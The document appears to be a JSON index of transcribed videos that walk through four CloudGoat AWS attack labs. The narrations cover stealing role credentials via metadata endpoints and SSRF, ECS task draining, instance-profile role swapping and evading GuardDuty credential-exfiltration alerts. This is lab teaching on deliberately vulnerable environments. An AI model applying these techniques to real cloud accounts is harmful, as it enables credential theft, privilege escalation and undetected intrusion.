the metadata for this so a very interesting metadata endpoint within containers ECS containers is they have their own metadata endpoint called 169 254 170 2 so let s try querying that do we have curl we do not do we have wget we do so if we just do W get alone it won t output the result of that of that query unlike curl but there is a flag that we can do Dash o dash and using this it will output everything from wget so wget Dash o dash169 254 170 2 and it says 404 not found and that s because we need to actually specify where the credentials are so that is I believe in V2 metadata I think this is the endpoint uh it might it might be with a dash and if not there is one environment variable that we can do so metadash data is it like this no it s not so I I forgot what that endpoint was but you can do this instead so 170 2 dollar AWS container credentials relative URI and this environment variable just contains the location of that metadata credential endpoint let s see exactly what that is actually so Echo dollar AWS container credentials relative URI and this is actually it so it s V2 credentials and then it is the container ID I believe or actually it s not I guess it s just some random uuid so anyways let s input all of this in so that we can get the credentials for the IAM role attached to this task so let s go AWS configure dash dash profile priv d put in the access key the secret access key and also the token so right here Echo AWS session token equals this put it in our AWS credentials file and now let s do caller Dash identity profile priv d and we see that this is the role associated with this container if we compare that to ec2 we see it s a different role ECS agent so there s two different uh roles here at least within the environment and they each have a different set of permissions most likely now a very common permission policy there s a very common ECS policy that s attached to ec2 instances when dealing with ECS we just call an ECS instance so let s see if there s any if there s IAM permissions associated with this new priv D profile that we have so list Dash roles profile prove d and we cannot do that so what about list Dash uh policies can we even list the policies within the environment no we cannot so I guess we cannot do that with uh private D how about ec2 we can t and list Dash roles also can t so uh we will check that out later in this video but let s just continue with what we do know so when we did ec2 describe Dash instances with our ec2 profile it did not work uh let s do region us-east1 uh yeah it said it did not work we do dash dash force and what about priv D can we do it with priv d we are also not authorized so we can t do it with priv d and ec2 so we need to somehow find uh some privileged escalation pathway with just knowing this let s go back here and look at this output so we have Docker PS um we have here main this is the vom site and we have this this um privileged container so let s try let s try figuring this out so can we list any clusters here so ECS listed as clusters profile priv D region us-east1 and we can list the Clusters so we see there s two different clusters here there s the default one and there s this ECS take over uh cluster so let s do AWS ECS list Dash tests profile priv D and we need to specify the cluster here otherwise I ll just go to this default cluster this is the one that we re interested in this ECS cluster here and we need to provide the region of us-east-1 so we see there are four different tasks here let s look at the different task definitions though so ECS describe Dash tasks and we need to input the tasks so let s go back here let s put all the different tasks and see what the output is so let s put this one this one and all of these and the reason we re doing that is just to see the differences between each task are they configured differently maybe they each have some sort of different permissions involved uh roles who knows so uh dash dash region profile priv d an error occurred identifiers for cluster your cluster is defaults and I also need to input a cluster here one of the very annoying things with ECS is you end up with these huge commands uh but that s just the nature of ECS it s sort of a harder service to try to take advantage of so we have this cluster and let s go back up here with the different clusters let s input this and we get the output of all of our different uh tasks so we see here we have huge output so we have privd here within this container instance Arn starts with the e4f we have pre so we have priv D we have Von site we saw those within the docker socket we have vault which we did not see and there was one more and yeah privity so this Vault one is the one that s most interesting because that s one that we did not see actually within our container instance let s go back to uh that output here it s a little better within C aws s sea lion tool so we can go to all of the ECS tasks that we ran if we do grep Dash R container or was it think container instance is what it is container instance and let s grab Dash r no it was oh probably Dash I uh so we see here there are only two different container instances so we saw four tasks but only two container instances so it s likely that there s two different ec2 instances that are being used to contain these containers but we re only inside one ec2 instance so we cannot actually describe the instances because apparently we do not have those permissions but there s likely two instances right now and there might even be more that we don t know about so a very interesting thing within ECS is that if you take a task and you drain it then the task will just go to a different container instance and continue running and we can see that with AWS ec2 if we go to describe Dash test definitions ECS describe task definitions describe or without the S here definition we can see each task definition and see how that task is defined so if we go AWS ECS list Dash task definitions profile priv d region of us-east-1 so we see an output of four different tasks we tasks we have privy site in web app so the interesting one is the Vault here but let s describe all the different task definitions so we have privd here give it a profile of priv d and region of us-east-1 I might need to specify the cluster yeah so cluster what was its well where did I put the cluster see cluster here uh copy like this let s go back here cluster like that and put that in unknown options maybe I should read the uh errors that are outputted so let s see what the error is an error occurred user does not authorize form on resource star because no identity policy allows that so describe Dash test definition maybe we just can t run this command um yeah so we re going to look at this a little bit uh late actually you know what I m gonna I m gonna cheat here a little bit just for sake of explanation let s do our Cloud go profile which has administrator access so if we look here we see that this is the task roll Arn so there s a role attached to this task and if we go to some other task uh so some other task definition let s do a vault here let s see what the test definition is for that and let s also see the task definition for Vons site so we have Von site that s the one that we compromised and we don t see a role that was attached to this task so if let s kind of verify that here really quickly so if we do um back here where where s our reverse shell our reverse cell died uh let s spin that up again so our container is this one right here now if you remember there was this environment variable called AWS container credentials relative URI so if we put that in here let s see what output we get and we don t get any output and the reason for that is because there is no role attached to this task so it s quite a low privilege task you could say I mean it doesn t even have any role attached to it but this priv D1 is high privileged because there is a rule attached to it and at least it can query the ECS service I don t know if high privilege is the right term but I think you know what I mean so let s look at this Vault one here really quickly so volt does not have any role attached to it but maybe within this this container there s some interesting information now this is just a CTF so all we need is a flag and actually we get the flag right here Echo flag one two three four six seven seven so we don t even need to get inside of this container but I did cheat with this by putting the administrator profile here so let s actually just uh get this container really quickly and so what we need to do is to drain this task and what we can do that with AWS ECS update Dash container instances Dash State dash dash cluster and now we need to specify our cluster so let s go to awcline what was it again this is one of the best things about this this tool is that you don t have to keep on running the same commands over and over if you do grip this R cluster here we go this is the cluster oh wait no that s the container instance let s do dash dash cluster like this and put like that and here we have it so that s this cluster profile of priv D and we want to drain it and we also want to specify what container instance we actually want to to drain so container Dash instances and if we go here what was the container instance describe Dash tasks dot txt we go to volts so volt had which container had this container instance now if you remember this is a different container instance than our volume site if you go to volunt site it starts with let s see it starts with E8 or e4f which is different than the zero uh that that zero AE that the Vault started with so let s drain this container instance so that it goes to the container instance that we already compromised so just drain that uh oh gotta put status draining and specify the region of us that she s dash one see how big this command is so um an error occurred ax is denied we get an X is denied let s do it for dash dash Force so profile priv d uh because no identity based policy allows the ECS update container instances state that s interesting uh let s see can we do that with the ECS profile I mean the ec2 profile and we can do it with the ec2 profile so just from that I have a high suspicion that the ec2 profile the or the agent what was the roll called it was AWS or cdawc lion it s the easiest takeover I think it was agent something like that grip roll and we get a whole bunch of junk here uh what what was that rule called ECS agent here we go user assumed role ECS takeover ECS agent so this is the instance ID of this ec2 instance so I have a high suspicion that the instance profile has the role the policy of that role is Amazon ec2 container service for ec2 role and that s just a really common policy to attach to your ec2 instances so that you can perform these ECS tasks I m just going to cheat once again I mean I I wouldn t really call it cheating I mean it s a so if you do get that policy um of this uh policy name actually we probably need to specify the policy Arn so let s do AWS IAM list policies and then grep this so if we had some sort of Target environment uh this profile of cloud go if we had some sort of uh Target environment then we could just do that within our own environment so it s not really cheating uh because we could just do it within our own environment and see for ourselves so AWS IEM get this policy policy Arn profile of cloud go and we see that V6 is the default version let s get that version get this policy Dash version and so these are the permissions associated with this service role policy managed policy so we can see that we can de-register container inch instances discover pull endpoint create a cluster so it s likely that we have all of these permissions with our ec2 profile that we configured into our AWS CLI so anyways we drained this container instance um so let s see if it s now within our container instance that we compromised so let s get this reverse show really quick do Docker PS and it seems like there s a larger output here let s see this is the new uh container instance now and this is the Vault that s now running on the ec2 instance that we compromised well actually technically we re inside of a Docker container but the docker socket of the host is mounted onto this container so we can see all the different Docker containers uh so now we can try to exec some commands into here Docker exec sh-c who am I and we can see that it works uh so the goal of this scenario is just to cat the flag that s uh inside of this container so let s just get that flag Docker exec sh-c cat flag Dot txt and we can see that this is the flag right here so there s a couple of things to look into this uh first of all mounting the docker socket into a of the host into a container is not recommended there are security risks involved in that so if you don t mind that the docker container gets rooted and because of that a user can access the host machine as well as other Docker containers if if that s not of concern then that s okay but likely it is of concern and you don t want a user to be able to break out of their own container and also to execute commands into other containers so because this was a privileged container and it was you have access to all the different Docker containers that the host has access to then you can easily query other containers such as this Vault container this privileged container and and so forth so now that we completed the scenario now let s look at the role that s attached to the privileged container as well as what the instance profile is that is associated with this ec2 instance uh so first of all let s look at this uh privileged container so if you do AWS uh describe Dash task definitions actually we already ran that let s go to awcli uh sea lion prove D ECS and what was its uh describe Dash tasks dot txt if you look at the role is it like this what was it priv d uh what was the role Arn oh that was in described task definitions describe Dash test definitions and no it did not work so let s let s do that with Cloud go so AWS um ECS describe Dash test definitions profile of cloud go which is the administrator access user that I have and let s specify our region of us-east-1 and the task definition actually we ran that so let s go that into Cloud go here ECS I m forgetting which profiles I ran what so uh let s go to roll so this is the privileged uh role that we have so let s go here AWS IAM list Dash attached role policies profile Cloud go and with this role Arn old name is what we need right so let s go roll name and this is the policy so let s get this policy get Dash policy profile Cloud go dash dash policy Dash Arn and it s misspelled Cloud goat there it helps to uh be able to spell so there we go Cloud go works this is the default version so this is the version being used so let s get that version version ID V1 get Dash policy Dash version and these are the different permissions that we can actually do one of them is list attached role policies did didn t we try that and we got an access denied error I feel like we tried that but anyways get role policy list Dash attached role policies we can list tasks get the policy version um and yeah so this is the privileged uh permission so now let s look at the instance profile so if we look at list Dash uh roles profile Cloud go we can see the other role name which is this one ECS takeover this is the ECS agent role that was associated with this instance so AWS IAM list Dash attached role policies role name and let s profile of cloud go and just as we suspected that is the policy name this Amazon ec2 container service for ec2 role so this is actually the policy of that rule which was attached to the instance profile being used by the ec2 instance that we compromised so uh one other thing we could do is check out the other ec2 instances uh within this AWS account because we saw that there were two different container instance Arns one that had the Vault container that we drained and the other one was the one that we compromised so let s do ec2 describe Dash instances profile of cloud go region u s Dash east-1 and so we see there is this one with a public IP address of 54 165 this is the public DNS name what was our public DS DNS name 54 175 87 which is different than this 54165-224 so ours was the one up here 54 175 the 87 so this was the other ec2 instance that had the volts container instance and so we were able to actually access that container instance by draining it and causing it to be mounted onto the ec2 instance that we compromised so anyway thank you for watching and I ll see you in the next video actually one more thing I m I m really curious to see what guard Duty looks like so let s check that out so let s go here guard Duty uh and um yikes yeah it s not looking too good we see uh unauthorized access instance credential exfiltration lots of findings here also from my previous uh videos this is the ec2 ssrf we didn t run this in such a stealthy manner we didn t create our own sneaky endpoints instance we also ran axis denied calls although that s not shown here so not too stealthy but that was not our goal anyways so anyways thank you for watching and I ll see you in the next video Music foreign",
				"image": "/images/ecs_takeover_web.png"
		},
    {
      "title"    : "Hacking in the Cloud - Cloudgoat: ec2_ssrf",
      "category" : "Videos",
      "tags"     : "Videos, IAM, AWS, EC2, Lambda",
      "url"      : "/videos/2022/11/25/EC2-SSRF/",
      "date"     : "Nov 25, 2022",
      "content"  : "hello everybody this is your day and this is the ec2 ssrf scenario in Cloud go it s quite a straightforward scenario you just start off as a low privileged IAM user who only has read access to Lambda functions and once you list functions you find that there s an access key and secret access key in the Lambda environment variables so you just take that access key in secret access key you configure it into a new profile which has ec2 access to describe all instances so then you find one instance that has a web application open it is vulnerable to an ssrf vulnerability which allows you to query the metadata service and obtain the role for the instance profile so once you get the credentials for that role you could then enumerate the S3 service to find that there is a secret S3 bucket containing the credentials of an admin user this admin user has the permissions to invoke a Lambda function which basically concludes the whole scenario so let s check it out we were provided the access key and secret key so as usual let s start with configuring our profile AWS configure dash dash profile Solus and let s put in the access Keen secret key and after that let s also configure our AWS C lion engagement so set engagement ec2 ssrf and now that we completed the configuration part let s start by enumerating Solace IAM permissions the reason we re going to start with the IEM service is because that s the juiciest service that s the one that contains the most misconfigurations and also this isn t this is a Solus this is an IAM user so that s another reason it s very likely that this user has IAM permissions so let s start off with listing the attached user policies of this user of this user and let s do AWS STS get Dash caller Dash identity dash dash profile Solus and this is the username so let s just put that in there and provide the profile of Solus and we are not allowed to run that call uh could we even list the users probably not let s see profile Solus and we can t how about the ec2 service can we do anything with that describe instances the profile of Solace and region us-east-1 again we cannot do that uh what about Lambda functions profile Solus and also provide the same region and that we do so we do have Lambda permissions and as we can see here we re also given an access key and secret key now that was quite straightforward to list the functions but suppose it was a less straightforward service there s also this tool called enumerate IAM and you can just install it from GitHub so Python 3 enumerate IAM dot Pi we could provide the axis key and the secret key so the axis key is right here and the secret key and what this will basically do is just brute force uh the all the permissions it ll just do read API calls to make sure that the AWS environment does not get modified so now it s just brute forcing all these different permissions um while that runs let s look at this axis Keen secret key and configure it into our profile so configure let s call this profile ec2 and provide the access key and secret key so now let s use STS get Dash caller Dash identity profile ec2 and we see that this is another user uh with this strange name Rex let s see if this user can do any ec2 commands as this says ec2 access key so ec2 describe Dash instances profile of ec2 and we must specify a region U S Dash east-1 and we can there is one instance here with this private IP address and this public IP address so let s take a look at this curl it and it says URL must be a string not undefined so seems like it s looking for some sort of parameter maybe a parameter called URL so let s do URL equals test and it says a different uh error now it says welcome to sethsex ssrf demo I want it to be useful but I could not find test for you so just from the hint of this scenario it says ssrf and that s quite a huge hint that maybe it s some server-side request forgery vulnerability in which you can query the metadata service so let s do that with 169 254 169 254 and we can let s do latest metadata I am security Dash credentials and we see the instance profile role let s just put that in there and now we can configure this new profile let s call it ssrf put in the axis key this secret access key and also the token so let s configure that almost went into my AWS credentials there so session token equals this and let s put it into Music AWS credentials so now asts get Dash Color dash identity profile ssrf this should work and we see it does this is the assumed role before enumerating the permissions of this user let s go back to that Lambda function that we saw earlier when we listed it so we saw that we were able to list the functions here what if we were able to get the function to get the source code of it so let s do AWS Lambda get Dash function and let s put in the function name function name and the function name is this we also need to put in our profile of was it Solas I believe yes it was Solas and our region of us Dash east-1 and we can get it so let s go here go over here paste that in and do save by the way this is the GitHub for that enumerate IAM tool you can you can find it right here so we have it downloaded uh I did not check where I downloaded it was it in the downloads file no it was not let s see show in folder uh oh it s right here cool so exit LS here it is so let s make a source directory just in case if we were to unzip this file as it is right now it s possible it will just clog up our directory so let s just uh unzip it here on zip and we see there is a function called Lambda dot Pi or a script called lambda pi and it does nothing all it does is it says you need to invoke this function to win so it s just a CTF so it does nothing interesting we need to invoke it can we invoke it with the Solace user so later WS Lambda invoke function name what is the name of the function it was this provide our profile of Solus again region of EOS Dash east-1 and out txt and we can t maybe we could do this with our ssrf user AWS Lambda invoke um with profile of ec2 nope what about the ssrf also can t so we can t do it with the ssrf ec2 and Solus user but we do have this new ssrf user so because this is a web application we got this ssrf from some web application and web applications typically talk with S3 buckets because it s very common that you re running some web application and you need to serve files coming from an S3 bucket so let s enumerate S3 with this profile of ssrf and we can see that there are three buckets here this is just the cloud formation template I have in my account and this is cloudtrail so let s look at this one this is one from the scenario so AWS s3ls put here put our profile of ssrf and we see that there s admin Dash user txt so let s copy that let s just put in the recursive file because I m too lazy to put slash admin Dash user txt just copy that here and here we have admin Dash user txt and this looks like an access key and a secret key so let s configure that profile admin X is key and the secret key so with this user I m assuming it has administrator access so let s see what happens if we just do a list Dash users profile admin and we don t have that we don t have administrator access because we have an access denied from that but this scenario says that you have to invoke the Lambda function in order to win so maybe the goal is not necessarily to escalate to administer to access but rather to just invoke that function so let s go back here where we invoked it and instead of putting the profile of Solus let s put the profile of admin and it looked like it looks like it worked and it says you win so that s basically this whole scenario it was just a vulnerable ec2 instance and a couple of misconfigurations such as putting an access key in secret access key into Lambda environment variables which allowed us to escalate privileges eventually to this admin user who has the ability to invoke Lambda functions and I almost forgot to show the output of this tool so let s check it out so we see that we have Lambda a couple of Lambda permissions that we could do one of them is Lambda list functions so you could just do that with every single user if you don t want to manually test each service and that s how you can find a pathway but just know that this is very noisy and if you look at the cloud tray logs it s just filled with tons of access denied calls so anyway thanks for watching and I ll see you in the next video Music foreign",
				"image": "/images/ec2_ssrf_web.png"
		},

    {
      "title"    : "Hacking in the Cloud - Cloudgoat: iam_privesc_by_attachment",
      "category" : "Videos",
      "tags"     : "Videos, IAM, AWS, EC2",
      "url"      : "/videos/2022/11/12/IAM-Privesc-By-Attachment/",
      "date"     : "Nov 12, 2022",
      "content"  : "hello everybody this is your day and this is the IAM privice by attachment scenario in the cloud good series we start off as a user who s actually not that low privileged he has the IAM pass role permission that notorious permission that we used also in the Lambda prevask video as well as a mini IAM and ec2 permissions among those IAM permissions are adding a role to an instance profile removing a roll from an instance profile and with the ec2 permission we can run an instance so we can create an instance and perform all kinds of different commands in this scenario we are able to remove a low privileged roll from an instance profile and add a high privilege role to that instance profile using that modified instance profile we can create a new ec2 instance and after sshing into that ec2 instance we can query the metadata service to obtain the credentials for that role and completely compromise the AWS account we were provided the access key and secret key of a user so let s just configure that into our AWS CLI but before doing that I m running a tool called AWS C lion so let s configure that first with awcline dash dash set Dash engagement and we ll call it IAM previsc by attachment this tool is made to keep your pen tests your AWS pen test efficient stealthy and organized I ll show this tool off um as we go further into the video so let s configure this profile we ll call it Kerrigan and put in the access key and the secret key and that s it and one of the really cool things about this tool is you can change your user agent so before running any API calls let s make sure we change our user agent because we re running within a parrot terminal so I installed this tool in opt AWS C line and here we get some sample user agents I m going to choose let s choose this Windows votes or core user agent so any API call that we see in cloudtrail will actually be this Windows user agent so we could do that with AWS client set user agent and just put in our user agent as well as our engagement which is IAM previous by attachment so now we have this user agent we can see any user agent that we configured in this directory so if we go to dot AWS client this is all of our engagements we have a default engagement the one that we just created and all of our API calls will be saved within this engagement so we ll see that as we go further into the video you could also see all the different engagements with this command so now that we configured this profile of Kerrigan we should start running some API calls so one of the first API calls that I run when I don t know anything about a user is to see if they can run some IAM service API calls so for example IAM list Dash attach Dash user Dash policies and then provide the username now we can assume that the username is Kerrigan and just reduce the amount of API calls that we are doing that we are performing but just to make sure we could also do this get Dash caller Dash identity command so we provide this with Kerrigan and as expected we this is our username so we could put in Carrigan here profile of Kerrigan and we are not allowed to we get an access denied error and so this is very bad when you re running a penetration test and the client wants you to be stealthy and you run an access denied call that s all access denied calls are quite noisy so you want to make sure that you avoid the the access denied calls so another thing that we can try doing is seeing if we can assume any roles so we can list the roles and provide our Kerrigan profiles and we see that these are the roles there s a ton of roles here I think there s nine in total in my AWS account but the interesting ones are the CG Meek roll and the mighty role we can assume that the mighty role has more permissions than the meek role just because of its name it s mighty versus Meek uh we see that the ec2 service can assume this role for both roles and because of that we should look at to see if we can run any ec2 commands because if we can create an ec2 instance and use this role with that instance then we can escalate our privileges this is kind of similar to a previous video that I did with a vulnerable with a Lambda previsque um I ll put that video in the link a link to that video in the description below basically what we did with that scenario is we created a Lambda function and we passed a role to that function we re gonna be doing something quite similar here so if you do AWS ec2 describe Dash instances profile Kerrigan let s just see if we can even run any API ec2 API calls so let s provide our region and we see that we have one instance here with this public IP address and this private IP address let s see the security groups so there s an SSH Security Group and an HTTP Security Group so I assume that we can SSH into this machine and maybe as an HTTP server as well that we could potentially exploit so let s do curl http and it just hangs uh it s there s likely uh some Security Group there that s stopping our API call we can check that out later in the video uh but um if you can t curl the HTTP server let s see if we can SSH and we can it is open uh so we can do that ec2 call maybe we can also create an ec2 instance and so we could do that if you re unsure about the command you can do AWS ec2 help and you can look at all the different API calls you can do in the ec2 service the one that we re interested in is the Run Dash instances API call this API call will allow you to create an ec2 instance and so let s do AWS ec2 run Dash instances help and these are all the different parameters that we can specify with this API call so let s do AWS ec2 describe Dash instances again so that we can get the image ID I m just going to use the same image ID as I as the other ec2 instance there so profile Kerrigan and again us that s East S1 now a really cool thing about this AWC lion tool is that it detects that I already ran this command before and instead of passing this API call to the AWS account that you re targeting it reads it from memory so this API call that I just ran did not get duplicated in cloudtrail it just reduces your API call footprint in the account that you re targeting it s also really fast because I read it from memory and I didn t have to wait for the API call to be performed so this is the image ID and the instance ID so let s just take this image ID here so AWS ec2 run Dash instances Dash Dash image Dash ID let s put this in dash dash instance type now this is not that important to specify uh it doesn t really matter what instance type you use I m going to use a micro instance type and that s just so that it reduces the cost to my AWS account I believe the default is M1 dot small so then we could provide a key name and before providing a key name we need to actually create a key so let s look at how to do that so we have AWS ec2 help put in key and we see that there s an API call there called create Dash key pair so let s create a key pair AWS ec2 create Dash key Dash pair and then provide a key name so this key name could be really anything I m going to just choose tests and we could put the output as text and provide our profile of Kerrigan and the region of usds East S1 so here is our private key we can just copy this and to test Dot pem set paste put all of this in and we re good WQ and now we have this key pair in the ec2 service so now when we provide a key name we could do test and what else do we need we have Security Group IDs let s specify those because we want to be able to SSH into this instance so let s use the same Security Group as this instance here so if we go down we have the SSH Security Group this is all we don t need the HTTP Security Group and let s see what else IAM instance Dash profile right here this is the very important parameter that we re going to need to exploit this vulnerability this misconfiguration with this this is basically how we re going to do this roll pass so we need to specify an instance profile but we don t know yet with the instance profile name is so if we go here we need to run another ec2 API call to list the instance profile actually this is an IAM list instance profile dash dash profile carrying and so now we can list all the different instance profiles we see that there is only one at the moment called Meek instance profile and it s given the meek role so if we were to attach this profile instance profile to our ec2 instance we won t get as many permissions as we would if we attach the mighty instance profile we don t need to change this instance profile name or anything about it the really important part here is this role right here so what we need to do is just remove this roll so if you can do that with AWS IAM remove dash roll from instance profile and we provide the instance profile name so let s copy this put it in and we can provide the role name which is this and so this is what we re going to need to remove so that we can then put in our own profile I could show you what it looks like if we don t do that so let s just add our own role to this instance profile without removing first the previous role so let s put in our roll instance profile name and we put this in and then provide our role name of the mighty role so let s go back here let s go to AWS sea lion IAM and Kerrigan is our profile and look at let s look at all the IAM commands that we ran so we have this list Dash rolls txt so let s do less Dash rolls and this is the output of the commands so it s the here s the meek roll and here is the mighty roll so let s copy this and put it here to remove that roll I mean to add that role and provide our Kerrigan profile and we get an error saying the limit exceeded when calling the add roll to instance profile operation cannot exceed quota for instance session for instance profile one so we cannot have more than one role for a given instance profile and so that s why we need to First remove this rule of the meek role and then put in our own role so we get a validation error uh this role and instance profile failed to satisfy constraint so they want an Arn and I gave just the role name so let s put this whole part I ll just copy this here now um you still get a validation error dash dash roll Dash name the specified value for role name is invalid did I copy that wrong let s erase it oh it s uh says already executed command so I added this dash dash Force here at the end this is just another C line parameter to make sure that you can run the same AP I call multiple times so it says that this at instance profile name failed to satisfy constraints oh I put a tilde there by accident now we can delete that profile just a little typo there so now let s add that role name that uh mighty roll and again we need to put dash dash Force at the end to allow the seed lion tool to run it twice so now when we look again at the instance profile dash dash Force we can see that we have the mighty role attached to this instance profile so now let s copy this instance profile and put it here and although the instance profile says Meek the the high privileged role is attached to it so with this command now let s see if there s any other parameters that we should specify one other parameter that we should specify is to provide a public IP address so that we can then connect to this instance via SSH so let s associate a public IP address to it and that looks to be about it so let s run this command and provide a profile of Kerrigan so it said expected an equal sign received end of file for this input now I put a instance I put a instance profile name so let s do name equals this and now we should specify a region us that s East one and an error occurred Security Group and subnet belong to different networks so let s also put the same subnet as the other instance so if you look here subnet this is the subnet that we re going to want to use dash dash subnet Dash ID and put that in and finally we were able to create our ec2 instance by the way notice how in the metadata options HTTP tokens is set to optional now typically when you run an HTTP server for an ec2 instance you want to set this to required and the reason you want to set that to required is because if you look at the previous video of cloud breach S3 we were able to exploit an ec2 instance because HTTP tokens was set to optional so right now this ec2 instance is setting up and we just need a weight let s describe the instances in this account and see if it is up yet so Kerrigan and provide our region of us-e-one and because this is running from memory it will not see our new instance so let s do dash dash Force and here is our previous instance and this here up here is our new instance so this is the public IP address it s SSH to it see if that works so it does so let s do test Dot pem Ubuntu at this server now the reason we re doing Ubuntu is because this is an Ubuntu image ID but this is something that s very common with an ec2 instances if Ubuntu does not work then you should do ec2 Dash user and see if that works so this SSH into this and we are now in to this instance so if we want to provide any AWS command we ll we will see that it s not installed yet but we could do we could install it with SNAP installed AWS the CLI and we have to do sudo and also provide classic here so here we can install the AWS CLI so we can configure the credentials of this role into this instance right now I can t run any AWS commands because I don t have any credentials in my AWS credentials file so let s get the AWS role credentials via the metadata so we do this latest metadata and as we can see here we have this IAM endpoint because we have an instance profile role attached to this instance so we do IAM security Dash credentials and we can see the role that s attached to this instance this is the IAM instance profile so now we can configure all these credentials now we could either configure them right here in our home IP address or we can configure that within the ec2 instance now configuring it within the ec2 instance is recommended because otherwise it will be triggering guard Duty with an IAM instance credential exfiltration outside AWS finding I go into depth about that in the previous video so let s configure this and we can call it default this could be just our default profile you can put in our access key our secret access key and also the token so if we go to AWS credentials AWS session token equals this so now we can run all sorts of commands AWS call identity and we have an invalid oh I suppose I put those credentials wrong so let s go back here credentials AWS I misspelled session here session and let s run that again so now we have the API call that successfully ran and now let s look at all the permissions of this role so AWS IAM list attached role policies and we have to provide our role name so let s put that in and we have this role that s attached or this policy that s attached to this rule so let s do AWS IEM get Dash policy Dash version version ID V1 or we don t need to provide a profile since our it s our default profile and we need to provide a policy Arn and we can see that we can perform any action on any resource so we have completely compromised this AWS account by attaching a high privileged instance profile to this ec2 instance role so if we go back and look at the roles we can see why we were able to escalate our privileges so AWS IAM list roles we provide a profile of care again and let s less this output so first of all we allowed any ec2 instance to assume these roles there were no conditions applied at all and for a role that is this highly privileged there should be some conditions applied to not allow any ec2 instance to assume this role furthermore the IAM user that we were provided had quite High privileges if we go back to this SSH instance and we look at our user so AWS IAM list that s attached user policies provide our profile actually or default I m not used to that username of Kerrigan and we see that here s the Kerrigan policy so let s just get this policy version policy version version ID and provide the policy Arn we can see all the different permissions that was allowed for this user we can list roles pass a role associate IAM instance profile we were given all of these permissions and so it would seem that perhaps this is not that high privilege of a user but this user can easily escalate privileges as we just demonstrated so it is important to follow the principle of least privilege and make sure that you re not providing your IAM users with too many permissions",
				"image": "/images/iam_privesc_by_attachment_web.png"
		},

    {
      "title"    : "Hacking in the Cloud - Cloudgoat: cloud_breach_s3",
      "category" : "Videos",
      "tags"     : "Privesc, Notes, GCP",
      "url"      : "/videos/2022/10/26/Cloud-Breach-S3/",
      "date"     : "Oct 26, 2022",
      "content"  : "hello everybody this is zero day and this is the cloud breach S3 scenario in Cloud go when starting the scenario you will simply provided the ec2 server IP address that you must Target and that's about it it's based off of the an actual scenario that happened with Capital One and how they got breached in 2019 which led to millions of credit cards being leaked we go over how to stealthily pen test an environment and bypass guard Duty findings specifically the instance credential exfiltration findings in the IAM Service as well as how to configure the ec2 metadata Service Such that it is more secure we were provided the ec2 server IP which we must Target so let's just curl this IP and see what response we get so curl this IP and we see that it says this server is configured to proxy request to the ec2 metadata service please modify your request host header and try again so let's just put our host and we're going to put the host as 169.254.169.254 and the reason for this is because this is the magic IP address associated with the metadata service and as it says that the server is configured a proxy request to the ec2 metadata service this is why we put this metadata service IP as the host header value now obviously this is quite insecure because the ec2 metadata service or any metadata service for that matter contains sensitive information such as security credentials so when we curled this IP address with this host header we have the metadata service endpoints that we can then curl so if we do curl slash latest which is the latest endpoint in the metadata service we can see that there's metadata user data and just Dynamic data but we want the metadata so we do metadata and we have all kinds of nice information to look at the most important one is in this IAM folder here as this contains the security credentials so security Dash credentials and then we see the ec2 role that is associated with this instance so when we query this role the output is the axis key secret access key and the token for this role so if we quickly just configure our profile we'll call it ec2 breach put in the access key the secret access key and the token and I'll just do Echo AWS session token equals this put it in the credentials file and so now we can perform commands like the AWS STS get Dash Color dash identity command something like this but the problem with this command is that it triggers alerts because for many reasons first of all we're running on a pen tested distro called parrot OS so our user agent will get logged by cloudtrail and then that will get flagged by guard Duty because it sees that some API call is coming from uh penetration testing operating system and so that is a medium finding by guard Duty to avoid that you could obviously change your user agent but that's not enough because on top of that we're running this command from an IP address that is not that of the ec2 instance it'll see that the source IP address is not this and so a way to get around that uh security researcher by the name of Nick frischetta found that if you create an ec2 instance within a private subnet behind multiple VPC endpoints that you could actually bypass the this guard Duty finding now previous to January 30th 2022 there was a guard Duty finding called instance credential exfiltration dot outside AWS and if we go we could just look that up on uh on Google we'll look at guard Duty findings iam and then we scroll down to the credential exfiltration findings we can see exactly what triggers these findings so we go down to credential exfiltration inside AWS this is the newer finding so let's start with the one that was there before January 30th so this is the original instance credential exfiltration finding by guard Duty and it states that this finding informs you that a host outside of AWS has attempted to run AWS API operations using temporary AWS credentials that were created on an ec2 instance in your AWS environment so this finding gets triggered when it sees that an API call is coming from an IP address that is not owned by AWS so what attackers did before January 30th is they simply spun up an ec2 instance within their own AWS account and only ran API calls from within that ec2 instance that way they were able to bypass this outside AWS finding once AWS found out about this they created a new finding called instance credential exfiltration inside AWS it basically states that if an API call is coming from an 8 from a source IP address that is owned by AWS but is not that of the ec2 instance that it came from if it's not from this exact ec2 instance IP address that you exfiltrated the credentials from then it triggers that inside AWS finding so the way to get around that is there's this tool called sneaky endpoints created by Nick frischetta I'm sure I'm butchering his name but he did great research on this and he created this tool called sneaky endpoints which you can just clone go I put in opt sneaky endpoints and all you have to do is terraform in it when you first download this repository and after you do that you just type terraform apply now this takes a while so I already ran it here you see the it outputs the instance ID the ec2 instance ID which you can connect to with AWS SSM start desk session start desk session Target and then you input the host ID now for some reason with my AWS installation whenever I run this command my shelf just freezes so I'll just connect to this via the browser and so I'll go here and go to ec2 connect to sneaky endpoints actions connect connects and so this way we can connect to the ec2 instance via the browser so I'll just type in bash really quick and this is the internal IP address of the ec2 instance now something really cool about this is that if you look at the cloud trail logs of the API calls coming from this ec2 instance you will not see a public IP address you'll actually just see the private IP address so let's just run a couple of commands so we say we see that we got the credentials from the ec2 instance so now let's put these credentials into this ec2 instance so call it ec2 breach and let's just transfer over the credentials I'll pause the video really quickly and put those in okay so now that I put the credentials in we can continue with our commands so a lot of the times there is sensitive information in S3 buckets so let's just enumerate that with AWS s3ls and provide the profile of ec2 breach and we see there are a couple of buckets these are the cloud trail logs that I've configured in my own environment uh these are the this is the sneaky endpoints bucket that you can use to transfer tools and whatever you would like into this ec2 instance and this is the bucket created by the cloud goat scenario so let's just look at this AWS s3ls and just put that in there and we see nice juicy information with cardholder data primary secondary corporate a really cool thing that you could do is if you want to download multiple file files recursively you could just do AWS S3 copy and put the recursive flag at the end and we downloaded all the files I should probably create a directory for that let's call it maker S3 and do that again and we see all of the files and that that's basically all there is for this Cloud good scenario but let's look at the cloud trail logs to see what that looked like and as well as uh guard duty to see if guard Duty trig if the credential exfiltration findings were triggered so if you look at cloudtrail we'll go to our bucket here our cloud trail bucket we'll refresh we'll see 1234 let's see what was logged then and then we will also see at 12 39 it does it every five minutes so let's just download this and I'll pause the video really quickly and just put all the files in my virtual machine so I transferred the cloudtrail log from 1239 into my virtual machine so let's look at this cloudtrail log and if we remember I think it was the the I the internal IP address for that ec2 instance that we created was 10.0.0.184 so if we look at the cloud trail logs we will see that that actually that IP address actually shows up instead of the public IP address so we see the source 